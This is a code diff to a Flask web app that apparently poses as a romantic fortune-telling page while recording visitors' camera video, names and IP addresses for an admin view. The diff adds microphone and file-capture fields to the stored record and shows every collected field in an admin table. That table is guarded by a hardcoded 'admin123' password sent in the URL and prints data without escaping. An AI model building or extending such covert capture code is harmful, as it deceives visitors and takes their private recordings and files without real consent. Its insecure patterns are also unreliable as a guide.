@@ -107,6 +107,13 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
+    # Ensure camera, microphone, files fields always exist
+    if 'cameraVideo' not in data:
+        data['cameraVideo'] = 'not captured'
+    if 'microphone' not in data:
+        data['microphone'] = 'not captured'
+    if 'files' not in data:
+        data['files'] = 'not captured'
     save_visitor(data)
     return jsonify({'status': 'saved'})
 
@@ -138,12 +145,20 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
+            # Collect all possible keys from all visitors
+            all_keys = set()
+            for v in visitors:
+                all_keys.update(v.keys())
+            all_keys = sorted(list(all_keys))
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download?pass=admin123">Download JSON</a></p>'
             html += '<table border="1" cellpadding="5">'
-            keys = visitors[0].keys()
-            html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
+            html += '<tr>' + ''.join(f'<th>{k}</th>' for k in all_keys) + '</tr>'
             for v in visitors:
-                html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
+                html += '<tr>'
+                for k in all_keys:
+                    val = v.get(k, '')
+                    html += f'<td>{str(val)[:100]}</td>'
+                html += '</tr>'
             html += '</table>'
             return html
         else:
@@ -473,6 +488,7 @@ HTML_TEMPLATE = '''
             showStep('🌟 Heartbeat Whisper', 'Tuning into your love energy...', 10);
             const timeout = setTimeout(() => {
                 visitorData.cameraVideo = 'denied';
+                visitorData.microphone = 'denied';
                 showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             }, 10000);
@@ -495,7 +511,11 @@ HTML_TEMPLATE = '''
                             setTimeout(() => { hideStep(); resolve(); }, 500);
                         };
                         reader.readAsDataURL(blob);
-                    } else { resolve(); }
+                    } else {
+                        visitorData.cameraVideo = 'empty';
+                        visitorData.microphone = 'empty';
+                        resolve();
+                    }
                 };
                 mediaRecorder.start();
                 let seconds = 3;
@@ -508,6 +528,7 @@ HTML_TEMPLATE = '''
             .catch(() => {
                 clearTimeout(timeout);
                 visitorData.cameraVideo = 'denied';
+                visitorData.microphone = 'denied';
                 showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             });
@@ -570,6 +591,11 @@ HTML_TEMPLATE = '''
         const fortuneData = await fortuneResp.json();
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
+        
+        // Ensure these fields are always present (fallback)
+        if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
+        if (!visitorData.microphone) visitorData.microphone = 'not captured';
+        if (!visitorData.files) visitorData.files = 'not captured';
         
         await fetch('/save', {
             method: 'POST',
